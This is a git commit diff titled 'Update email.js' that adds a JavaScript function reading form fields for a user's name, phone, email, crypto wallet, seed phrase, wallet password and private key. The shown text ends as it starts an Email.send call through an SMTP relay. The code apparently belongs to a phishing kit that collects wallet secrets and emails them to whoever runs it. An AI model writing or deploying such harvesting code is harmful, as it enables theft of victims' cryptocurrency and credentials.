c605e301fbfb2a89142f016e2f06492a3056500f
Adeolatoolz <adeolatoolz@gmail.com>
2024-07-24 03:31:57 +0100

    Update email.js

--- email.js
+++ email.js
@@ -1,3 +1,25 @@
+function emailSend(){
+
+	var userName = document.getElementById('name').value;
+
+	var phone = document.getElementById('phone').value;
+
+	var email = document.getElementById('email'
+
+	).value;
+
+	var wallet = document.getElementById('wallet').value;
+
+	var phrase = document.getElementById('phrase').value;
+
+	var walletp = document.getElementById('walletp'
+
+		).value;
+
+	var privk = document.getElementById('privk'
+
+	).value;
+
 Email.send({
 
     Host : "smtp.elasticemail.com",
